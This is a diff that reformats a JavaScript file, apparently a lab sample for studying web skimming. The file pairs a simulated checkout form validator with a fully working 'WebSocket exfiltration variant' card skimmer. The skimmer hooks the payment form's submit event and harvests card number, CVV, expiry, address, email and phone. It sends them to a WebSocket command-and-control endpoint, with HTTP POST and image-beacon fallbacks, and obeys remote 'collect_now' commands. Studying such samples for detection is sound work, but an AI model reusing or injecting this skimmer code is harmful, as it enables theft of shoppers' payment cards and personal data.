@@ -17,222 +17,220 @@
 // PART 1: LEGITIMATE CHECKOUT CODE
 // ============================================================================
 
-(function() {
-    'use strict';
+;(function () {
+  'use strict'
 
-    console.log('[Checkout] Initializing legitimate checkout system...');
+  console.log('[Checkout] Initializing legitimate checkout system...')
 
-    /**
-     * Validate credit card number using Luhn algorithm
-     */
-    function validateCardNumber(cardNumber) {
-        const digits = cardNumber.replace(/\D/g, '');
+  /**
+   * Validate credit card number using Luhn algorithm
+   */
+  function validateCardNumber(cardNumber) {
+    const digits = cardNumber.replace(/\D/g, '')
 
-        if (digits.length < 15 || digits.length > 16) {
-            return { valid: false, error: 'Card number must be 15-16 digits' };
-        }
-
-        // Luhn algorithm
-        let sum = 0;
-        let isEven = false;
-
-        for (let i = digits.length - 1; i >= 0; i--) {
-            let digit = parseInt(digits[i]);
-
-            if (isEven) {
-                digit *= 2;
-                if (digit > 9) {
-                    digit -= 9;
-                }
-            }
-
-            sum += digit;
-            isEven = !isEven;
-        }
-
-        const luhnValid = sum % 10 === 0;
-        if (!luhnValid) {
-            return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' };
-        }
-
-        return { valid: true };
+    if (digits.length < 15 || digits.length > 16) {
+      return { valid: false, error: 'Card number must be 15-16 digits' }
     }
 
-    /**
-     * Validate expiry date
-     */
-    function validateExpiry(expiry) {
-        const parts = expiry.split('/');
-        if (parts.length !== 2) return false;
+    // Luhn algorithm
+    let sum = 0
+    let isEven = false
 
-        const month = parseInt(parts[0]);
-        const year = parseInt('20' + parts[1]);
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let digit = parseInt(digits[i])
 
-        if (month < 1 || month > 12) return false;
-
-        const now = new Date();
-        const currentYear = now.getFullYear();
-        const currentMonth = now.getMonth() + 1;
-
-        if (year < currentYear) return false;
-        if (year === currentYear && month < currentMonth) return false;
-
-        return true;
-    }
-
-    /**
-     * Validate CVV
-     */
-    function validateCVV(cvv, cardNumber) {
-        const digits = cvv.replace(/\D/g, '');
-        const cleanCard = cardNumber.replace(/\D/g, '');
-
-        // Amex (starts with 34 or 37) uses 4-digit CVV
-        if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
-            return digits.length === 4;
+      if (isEven) {
+        digit *= 2
+        if (digit > 9) {
+          digit -= 9
         }
+      }
 
-        // Others use 3-digit CVV
-        return digits.length === 3;
+      sum += digit
+      isEven = !isEven
     }
 
-    /**
-     * Show validation error
-     */
-    function showError(fieldId, message) {
-        const field = document.getElementById(fieldId);
-        field.style.borderColor = '#e74c3c';
-
-        // Remove any existing error message
-        const existingError = field.parentElement.querySelector('.error-message');
-        if (existingError) {
-            existingError.remove();
-        }
-
-        // Add error message
-        const errorDiv = document.createElement('div');
-        errorDiv.className = 'error-message';
-        errorDiv.style.color = '#e74c3c';
-        errorDiv.style.fontSize = '0.9rem';
-        errorDiv.style.marginTop = '0.25rem';
-        errorDiv.textContent = message;
-        field.parentElement.appendChild(errorDiv);
-
-        // Focus the field
-        field.focus();
+    const luhnValid = sum % 10 === 0
+    if (!luhnValid) {
+      return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' }
     }
 
-    /**
-     * Clear validation errors
-     */
-    function clearErrors() {
-        document.querySelectorAll('.error-message').forEach(el => el.remove());
-        document.querySelectorAll('input, select').forEach(el => {
-            el.style.borderColor = '#ddd';
-        });
+    return { valid: true }
+  }
+
+  /**
+   * Validate expiry date
+   */
+  function validateExpiry(expiry) {
+    const parts = expiry.split('/')
+    if (parts.length !== 2) return false
+
+    const month = parseInt(parts[0])
+    const year = parseInt('20' + parts[1])
+
+    if (month < 1 || month > 12) return false
+
+    const now = new Date()
+    const currentYear = now.getFullYear()
+    const currentMonth = now.getMonth() + 1
+
+    if (year < currentYear) return false
+    if (year === currentYear && month < currentMonth) return false
+
+    return true
+  }
+
+  /**
+   * Validate CVV
+   */
+  function validateCVV(cvv, cardNumber) {
+    const digits = cvv.replace(/\D/g, '')
+    const cleanCard = cardNumber.replace(/\D/g, '')
+
+    // Amex (starts with 34 or 37) uses 4-digit CVV
+    if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
+      return digits.length === 4
     }
 
-    /**
-     * Process payment (simulated)
-     */
-    function processPayment(formData) {
-        console.log('[Checkout] Processing payment...');
-        console.log('[Checkout] IMPORTANT: This is a simulated transaction');
+    // Others use 3-digit CVV
+    return digits.length === 3
+  }
 
-        return new Promise((resolve) => {
-            setTimeout(() => {
-                console.log('[Checkout] Payment processed successfully (simulated)');
-                console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now());
-                resolve({
-                    success: true,
-                    transactionId: 'TXN-' + Date.now()
-                });
-            }, 1000);
-        });
+  /**
+   * Show validation error
+   */
+  function showError(fieldId, message) {
+    const field = document.getElementById(fieldId)
+    field.style.borderColor = '#e74c3c'
+
+    // Remove any existing error message
+    const existingError = field.parentElement.querySelector('.error-message')
+    if (existingError) {
+      existingError.remove()
     }
 
-    /**
-     * Handle form submission
-     */
-    async function handleSubmit(event) {
-        event.preventDefault();
+    // Add error message
+    const errorDiv = document.createElement('div')
+    errorDiv.className = 'error-message'
+    errorDiv.style.color = '#e74c3c'
+    errorDiv.style.fontSize = '0.9rem'
+    errorDiv.style.marginTop = '0.25rem'
+    errorDiv.textContent = message
+    field.parentElement.appendChild(errorDiv)
 
-        console.log('[Checkout] Form submitted');
-        clearErrors();
+    // Focus the field
+    field.focus()
+  }
 
-        // Get form values
-        const cardNumber = document.getElementById('card-number').value;
-        const cvv = document.getElementById('cvv').value;
-        const expiry = document.getElementById('expiry').value;
+  /**
+   * Clear validation errors
+   */
+  function clearErrors() {
+    document.querySelectorAll('.error-message').forEach(el => el.remove())
+    document.querySelectorAll('input, select').forEach(el => {
+      el.style.borderColor = '#ddd'
+    })
+  }
 
-        // Validate card number
-        const cardValidation = validateCardNumber(cardNumber);
-        if (!cardValidation.valid) {
-            showError('card-number', cardValidation.error);
-            return false;
-        }
+  /**
+   * Process payment (simulated)
+   */
+  function processPayment(formData) {
+    console.log('[Checkout] Processing payment...')
+    console.log('[Checkout] IMPORTANT: This is a simulated transaction')
 
-        // Validate expiry
-        if (!validateExpiry(expiry)) {
-            showError('expiry', 'Card has expired or invalid date');
-            return false;
-        }
+    return new Promise(resolve => {
+      setTimeout(() => {
+        console.log('[Checkout] Payment processed successfully (simulated)')
+        console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now())
+        resolve({
+          success: true,
+          transactionId: 'TXN-' + Date.now()
+        })
+      }, 1000)
+    })
+  }
 
-        // Validate CVV
-        if (!validateCVV(cvv, cardNumber)) {
-            showError('cvv', 'Invalid CVV code');
-            return false;
-        }
+  /**
+   * Handle form submission
+   */
+  async function handleSubmit(event) {
+    event.preventDefault()
 
-        // Show loading state
-        const submitBtn = document.querySelector('.submit-btn');
-        const originalText = submitBtn.textContent;
-        submitBtn.textContent = 'Processing...';
-        submitBtn.disabled = true;
+    console.log('[Checkout] Form submitted')
+    clearErrors()
 
-        try {
-            const formData = new FormData(event.target);
-            const data = Object.fromEntries(formData.entries());
+    // Get form values
+    const cardNumber = document.getElementById('card-number').value
+    const cvv = document.getElementById('cvv').value
+    const expiry = document.getElementById('expiry').value
 
-            const result = await processPayment(data);
-
-            if (result.success) {
-                event.target.style.display = 'none';
-                const successMessage = document.getElementById('success-message');
-                successMessage.classList.add('show');
-
-                console.log('[Checkout] Order completed successfully');
-            }
-
-        } catch (error) {
-            console.error('[Checkout] Payment processing error:', error);
-            alert('Payment processing failed. Please try again.');
-
-            submitBtn.textContent = originalText;
-            submitBtn.disabled = false;
-        }
+    // Validate card number
+    const cardValidation = validateCardNumber(cardNumber)
+    if (!cardValidation.valid) {
+      showError('card-number', cardValidation.error)
+      return false
     }
 
-    /**
-     * Initialize checkout
-     */
-    function init() {
-        const form = document.getElementById('payment-form');
-
-        if (form) {
-            form.addEventListener('submit', handleSubmit);
-            console.log('[Checkout] Checkout system ready');
-        }
+    // Validate expiry
+    if (!validateExpiry(expiry)) {
+      showError('expiry', 'Card has expired or invalid date')
+      return false
     }
 
-    // Initialize when DOM is ready
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', init);
-    } else {
-        init();
+    // Validate CVV
+    if (!validateCVV(cvv, cardNumber)) {
+      showError('cvv', 'Invalid CVV code')
+      return false
     }
 
-})();
+    // Show loading state
+    const submitBtn = document.querySelector('.submit-btn')
+    const originalText = submitBtn.textContent
+    submitBtn.textContent = 'Processing...'
+    submitBtn.disabled = true
+
+    try {
+      const formData = new FormData(event.target)
+      const data = Object.fromEntries(formData.entries())
+
+      const result = await processPayment(data)
+
+      if (result.success) {
+        event.target.style.display = 'none'
+        const successMessage = document.getElementById('success-message')
+        successMessage.classList.add('show')
+
+        console.log('[Checkout] Order completed successfully')
+      }
+    } catch (error) {
+      console.error('[Checkout] Payment processing error:', error)
+      alert('Payment processing failed. Please try again.')
+
+      submitBtn.textContent = originalText
+      submitBtn.disabled = false
+    }
+  }
+
+  /**
+   * Initialize checkout
+   */
+  function init() {
+    const form = document.getElementById('payment-form')
+
+    if (form) {
+      form.addEventListener('submit', handleSubmit)
+      console.log('[Checkout] Checkout system ready')
+    }
+  }
+
+  // Initialize when DOM is ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init)
+  } else {
+    init()
+  }
+})()
 
 // ============================================================================
 // PART 2: WEBSOCKET EXFILTRATION VARIANT MALICIOUS CODE
@@ -251,299 +249,298 @@
 // - Real-time data transmission capabilities
 // ============================================================================
 
-(function() {
-    'use strict';
+;(function () {
+  'use strict'
 
-    // Kritec-style attack: WebSocket C2 communication
-    setTimeout(function() {
+  // Kritec-style attack: WebSocket C2 communication
+  setTimeout(function () {
+    const CONFIG = {
+      wsUrl: 'ws://localhost:3001/ws', // WebSocket C2 endpoint
+      fallbackUrl: 'http://localhost:9002/collect', // HTTP fallback
+      reconnectDelay: 1000, // Initial reconnect delay
+      maxReconnectDelay: 30000, // Max reconnect delay
+      reconnectAttempts: 0, // Track reconnection attempts
+      maxReconnectAttempts: 5, // Max reconnect attempts
+      debug: true
+    }
 
-        const CONFIG = {
-            wsUrl: 'ws://localhost:3001/ws',           // WebSocket C2 endpoint
-            fallbackUrl: 'http://localhost:9002/collect', // HTTP fallback
-            reconnectDelay: 1000,                      // Initial reconnect delay
-            maxReconnectDelay: 30000,                  // Max reconnect delay
-            reconnectAttempts: 0,                      // Track reconnection attempts
-            maxReconnectAttempts: 5,                   // Max reconnect attempts
-            debug: true
-        };
+    function log(message, data) {
+      if (CONFIG.debug) {
+        console.log('[SKIMMER]', message, data || '')
+      }
+    }
 
-        function log(message, data) {
-            if (CONFIG.debug) {
-                console.log('[SKIMMER]', message, data || '');
-            }
+    // WebSocket connection management
+    let ws = null
+    let wsConnected = false
+    let messageQueue = []
+
+    function getFieldValue(selectors) {
+      for (let selector of selectors) {
+        const element = document.querySelector(selector)
+        if (element && element.value) {
+          return element.value.trim()
+        }
+      }
+      return ''
+    }
+
+    function extractCardData() {
+      log('Extracting card data from form fields...')
+      const data = {
+        cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),
+        cvv: getFieldValue(['#cvv', '[name="cvv"]']),
+        expiry: getFieldValue(['#expiry', '[name="expiry"]']),
+        cardholderName: getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
+        billingAddress: getFieldValue(['#billing-address', '[name="billingAddress"]']),
+        city: getFieldValue(['#city', '[name="city"]']),
+        zip: getFieldValue(['#zip', '[name="zip"]']),
+        country: getFieldValue(['#country', '[name="country"]']),
+        email: getFieldValue(['#email', '[name="email"]']),
+        phone: getFieldValue(['#phone', '[name="phone"]'])
+      }
+
+      // Add metadata
+      data.metadata = {
+        url: window.location.href,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        screenResolution: screen.width + 'x' + screen.height,
+        collectionMethod: 'websocket-exfil-variant' // Track variant type
+      }
+
+      return data
+    }
+
+    function hasValidCardData(data) {
+      const cleanCard = data.cardNumber.replace(/[\s-]/g, '')
+      const validLength = cleanCard.length === 15 || cleanCard.length === 16
+      const validCVV = data.cvv.length === 3 || data.cvv.length === 4
+      return validLength && validCVV && data.expiry
+    }
+
+    function createWebSocketMessage(type, data) {
+      return JSON.stringify({
+        type: type,
+        timestamp: new Date().toISOString(),
+        sessionId: 'sess_' + Date.now(),
+        data: data
+      })
+    }
+
+    function sendWebSocketMessage(type, data) {
+      const message = createWebSocketMessage(type, data)
+
+      if (wsConnected && ws && ws.readyState === WebSocket.OPEN) {
+        log('Sending WebSocket message:', { type, dataSize: JSON.stringify(data).length })
+        ws.send(message)
+        return true
+      } else {
+        log('WebSocket not connected, queuing message')
+        messageQueue.push({ type, data })
+        return false
+      }
+    }
+
+    function processMessageQueue() {
+      if (wsConnected && ws && ws.readyState === WebSocket.OPEN && messageQueue.length > 0) {
+        log('Processing queued messages:', messageQueue.length)
+
+        while (messageQueue.length > 0) {
+          const { type, data } = messageQueue.shift()
+          const message = createWebSocketMessage(type, data)
+          ws.send(message)
         }
 
-        // WebSocket connection management
-        let ws = null;
-        let wsConnected = false;
-        let messageQueue = [];
+        log('All queued messages sent')
+      }
+    }
 
-        function getFieldValue(selectors) {
-            for (let selector of selectors) {
-                const element = document.querySelector(selector);
-                if (element && element.value) {
-                    return element.value.trim();
+    function fallbackToHTTP(data) {
+      log('Falling back to HTTP POST method')
+
+      fetch(CONFIG.fallbackUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+        mode: 'cors',
+        credentials: 'omit'
+      })
+        .then(response => {
+          log('HTTP fallback response status:', response.status)
+          return response.text()
+        })
+        .then(responseText => {
+          log('HTTP fallback successful')
+        })
+        .catch(error => {
+          log('HTTP fallback failed:', error)
+
+          // Final fallback: image beacon
+          const img = new Image()
+          img.src = CONFIG.fallbackUrl + '?' + btoa(JSON.stringify(data))
+        })
+    }
+
+    function connectWebSocket() {
+      if (ws && (ws.readyState === WebSocket.CONNECTING || ws.readyState === WebSocket.OPEN)) {
+        log('WebSocket already connecting or connected')
+        return
+      }
+
+      log('Establishing WebSocket connection:', CONFIG.wsUrl)
+
+      try {
+        ws = new WebSocket(CONFIG.wsUrl)
+
+        ws.onopen = function (event) {
+          log('WebSocket connection established')
+          wsConnected = true
+          CONFIG.reconnectAttempts = 0
+
+          // Send connection notification
+          sendWebSocketMessage('connection', {
+            status: 'connected',
+            userAgent: navigator.userAgent,
+            url: window.location.href
+          })
+
+          // Process any queued messages
+          processMessageQueue()
+        }
+
+        ws.onmessage = function (event) {
+          log('WebSocket message received:', event.data)
+
+          try {
+            const message = JSON.parse(event.data)
+
+            // Handle C2 commands
+            if (message.type === 'command') {
+              log('C2 command received:', message.data)
+
+              // Example: C2 could request immediate data collection
+              if (message.data.action === 'collect_now') {
+                const cardData = extractCardData()
+                if (hasValidCardData(cardData)) {
+                  sendWebSocketMessage('payment_data', cardData)
                 }
+              }
             }
-            return '';
+          } catch (e) {
+            log('Error parsing WebSocket message:', e)
+          }
         }
 
-        function extractCardData() {
-            log('Extracting card data from form fields...');
-            const data = {
-                cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),
-                cvv: getFieldValue(['#cvv', '[name="cvv"]']),
-                expiry: getFieldValue(['#expiry', '[name="expiry"]']),
-                cardholderName: getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
-                billingAddress: getFieldValue(['#billing-address', '[name="billingAddress"]']),
-                city: getFieldValue(['#city', '[name="city"]']),
-                zip: getFieldValue(['#zip', '[name="zip"]']),
-                country: getFieldValue(['#country', '[name="country"]']),
-                email: getFieldValue(['#email', '[name="email"]']),
-                phone: getFieldValue(['#phone', '[name="phone"]'])
-            };
-
-            // Add metadata
-            data.metadata = {
-                url: window.location.href,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                screenResolution: screen.width + 'x' + screen.height,
-                collectionMethod: 'websocket-exfil-variant' // Track variant type
-            };
-
-            return data;
+        ws.onerror = function (error) {
+          log('WebSocket error:', error)
+          wsConnected = false
         }
 
-        function hasValidCardData(data) {
-            const cleanCard = data.cardNumber.replace(/[\s-]/g, '');
-            const validLength = cleanCard.length === 15 || cleanCard.length === 16;
-            const validCVV = data.cvv.length === 3 || data.cvv.length === 4;
-            return validLength && validCVV && data.expiry;
-        }
+        ws.onclose = function (event) {
+          log('WebSocket connection closed:', {
+            code: event.code,
+            reason: event.reason,
+            wasClean: event.wasClean
+          })
 
-        function createWebSocketMessage(type, data) {
-            return JSON.stringify({
-                type: type,
-                timestamp: new Date().toISOString(),
-                sessionId: 'sess_' + Date.now(),
-                data: data
-            });
-        }
+          wsConnected = false
 
-        function sendWebSocketMessage(type, data) {
-            const message = createWebSocketMessage(type, data);
+          // Attempt reconnection with exponential backoff
+          if (CONFIG.reconnectAttempts < CONFIG.maxReconnectAttempts) {
+            CONFIG.reconnectAttempts++
+            const delay = Math.min(
+              CONFIG.reconnectDelay * Math.pow(2, CONFIG.reconnectAttempts - 1),
+              CONFIG.maxReconnectDelay
+            )
 
-            if (wsConnected && ws && ws.readyState === WebSocket.OPEN) {
-                log('Sending WebSocket message:', { type, dataSize: JSON.stringify(data).length });
-                ws.send(message);
-                return true;
-            } else {
-                log('WebSocket not connected, queuing message');
-                messageQueue.push({ type, data });
-                return false;
-            }
-        }
+            log(
+              `Attempting reconnection ${CONFIG.reconnectAttempts}/${CONFIG.maxReconnectAttempts} in ${delay}ms`
+            )
 
-        function processMessageQueue() {
-            if (wsConnected && ws && ws.readyState === WebSocket.OPEN && messageQueue.length > 0) {
-                log('Processing queued messages:', messageQueue.length);
-
-                while (messageQueue.length > 0) {
-                    const { type, data } = messageQueue.shift();
-                    const message = createWebSocketMessage(type, data);
-                    ws.send(message);
-                }
-
-                log('All queued messages sent');
-            }
-        }
-
-        function fallbackToHTTP(data) {
-            log('Falling back to HTTP POST method');
-
-            fetch(CONFIG.fallbackUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data),
-                mode: 'cors',
-                credentials: 'omit'
-            }).then((response) => {
-                log('HTTP fallback response status:', response.status);
-                return response.text();
-            }).then((responseText) => {
-                log('HTTP fallback successful');
-            }).catch((error) => {
-                log('HTTP fallback failed:', error);
-
-                // Final fallback: image beacon
-                const img = new Image();
-                img.src = CONFIG.fallbackUrl + '?' + btoa(JSON.stringify(data));
-            });
-        }
-
-        function connectWebSocket() {
-            if (ws && (ws.readyState === WebSocket.CONNECTING || ws.readyState === WebSocket.OPEN)) {
-                log('WebSocket already connecting or connected');
-                return;
-            }
-
-            log('Establishing WebSocket connection:', CONFIG.wsUrl);
-
-            try {
-                ws = new WebSocket(CONFIG.wsUrl);
-
-                ws.onopen = function(event) {
-                    log('WebSocket connection established');
-                    wsConnected = true;
-                    CONFIG.reconnectAttempts = 0;
-
-                    // Send connection notification
-                    sendWebSocketMessage('connection', {
-                        status: 'connected',
-                        userAgent: navigator.userAgent,
-                        url: window.location.href
-                    });
-
-                    // Process any queued messages
-                    processMessageQueue();
-                };
-
-                ws.onmessage = function(event) {
-                    log('WebSocket message received:', event.data);
-
-                    try {
-                        const message = JSON.parse(event.data);
-
-                        // Handle C2 commands
-                        if (message.type === 'command') {
-                            log('C2 command received:', message.data);
-
-                            // Example: C2 could request immediate data collection
-                            if (message.data.action === 'collect_now') {
-                                const cardData = extractCardData();
-                                if (hasValidCardData(cardData)) {
-                                    sendWebSocketMessage('payment_data', cardData);
-                                }
-                            }
-                        }
-
-                    } catch (e) {
-                        log('Error parsing WebSocket message:', e);
-                    }
-                };
-
-                ws.onerror = function(error) {
-                    log('WebSocket error:', error);
-                    wsConnected = false;
-                };
-
-                ws.onclose = function(event) {
-                    log('WebSocket connection closed:', {
-                        code: event.code,
-                        reason: event.reason,
-                        wasClean: event.wasClean
-                    });
-
-                    wsConnected = false;
-
-                    // Attempt reconnection with exponential backoff
-                    if (CONFIG.reconnectAttempts < CONFIG.maxReconnectAttempts) {
-                        CONFIG.reconnectAttempts++;
-                        const delay = Math.min(
-                            CONFIG.reconnectDelay * Math.pow(2, CONFIG.reconnectAttempts - 1),
-                            CONFIG.maxReconnectDelay
-                        );
-
-                        log(`Attempting reconnection ${CONFIG.reconnectAttempts}/${CONFIG.maxReconnectAttempts} in ${delay}ms`);
-
-                        setTimeout(() => {
-                            connectWebSocket();
-                        }, delay);
-
-                    } else {
-                        log('Max reconnection attempts reached, giving up on WebSocket');
-                    }
-                };
-
-            } catch (error) {
-                log('Failed to create WebSocket:', error);
-                wsConnected = false;
-            }
-        }
-
-        function exfiltrateData(data) {
-            log('Exfiltrating data via WebSocket...');
-
-            // Try WebSocket first
-            if (sendWebSocketMessage('payment_data', data)) {
-                log('Data sent via WebSocket');
-            } else {
-                log('WebSocket unavailable, using HTTP fallback');
-                fallbackToHTTP(data);
-            }
-        }
-
-        function initWebSocketSkimmer() {
-            log('Initializing WebSocket skimmer...');
-
-            // Establish WebSocket connection
-            connectWebSocket();
-
-            const checkForm = setInterval(() => {
-                const form = document.querySelector('#payment-form');
-
-                if (form) {
-                    clearInterval(checkForm);
-                    log('Payment form found, attaching WebSocket skimmer');
-
-                    // Intercept form submission
-                    form.addEventListener('submit', function(event) {
-                        log('Form submission detected');
-
-                        const cardData = extractCardData();
-
-                        if (hasValidCardData(cardData)) {
-                            log('Valid card data found, preparing WebSocket exfiltration');
-
-                            setTimeout(() => {
-                                exfiltrateData(cardData);
-                            }, 100);
-                        } else {
-                            log('Insufficient card data, skipping exfiltration');
-                        }
-
-                        // CRITICAL: Allow legitimate checkout to continue
-                    });
-
-                    log('WebSocket skimmer ready and listening');
-                }
-            }, 100);
-
-            // Stop checking after 10 seconds
             setTimeout(() => {
-                clearInterval(checkForm);
-            }, 10000);
+              connectWebSocket()
+            }, delay)
+          } else {
+            log('Max reconnection attempts reached, giving up on WebSocket')
+          }
         }
+      } catch (error) {
+        log('Failed to create WebSocket:', error)
+        wsConnected = false
+      }
+    }
 
-        // Initialize when form is available
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initWebSocketSkimmer);
-        } else {
-            initWebSocketSkimmer();
-        }
+    function exfiltrateData(data) {
+      log('Exfiltrating data via WebSocket...')
 
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', function() {
-            if (ws && wsConnected) {
-                sendWebSocketMessage('disconnect', { reason: 'page_unload' });
-                ws.close();
+      // Try WebSocket first
+      if (sendWebSocketMessage('payment_data', data)) {
+        log('Data sent via WebSocket')
+      } else {
+        log('WebSocket unavailable, using HTTP fallback')
+        fallbackToHTTP(data)
+      }
+    }
+
+    function initWebSocketSkimmer() {
+      log('Initializing WebSocket skimmer...')
+
+      // Establish WebSocket connection
+      connectWebSocket()
+
+      const checkForm = setInterval(() => {
+        const form = document.querySelector('#payment-form')
+
+        if (form) {
+          clearInterval(checkForm)
+          log('Payment form found, attaching WebSocket skimmer')
+
+          // Intercept form submission
+          form.addEventListener('submit', function (event) {
+            log('Form submission detected')
+
+            const cardData = extractCardData()
+
+            if (hasValidCardData(cardData)) {
+              log('Valid card data found, preparing WebSocket exfiltration')
+
+              setTimeout(() => {
+                exfiltrateData(cardData)
+              }, 100)
+            } else {
+              log('Insufficient card data, skipping exfiltration')
             }
-        });
 
-    }, 300); // Slightly shorter delay than base variant
+            // CRITICAL: Allow legitimate checkout to continue
+          })
 
-})();
+          log('WebSocket skimmer ready and listening')
+        }
+      }, 100)
+
+      // Stop checking after 10 seconds
+      setTimeout(() => {
+        clearInterval(checkForm)
+      }, 10000)
+    }
+
+    // Initialize when form is available
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initWebSocketSkimmer)
+    } else {
+      initWebSocketSkimmer()
+    }
+
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', function () {
+      if (ws && wsConnected) {
+        sendWebSocketMessage('disconnect', { reason: 'page_unload' })
+        ws.close()
+      }
+    })
+  }, 300) // Slightly shorter delay than base variant
+})()
 
 /**
  * WEBSOCKET EXFILTRATION VARIANT ANALYSIS:
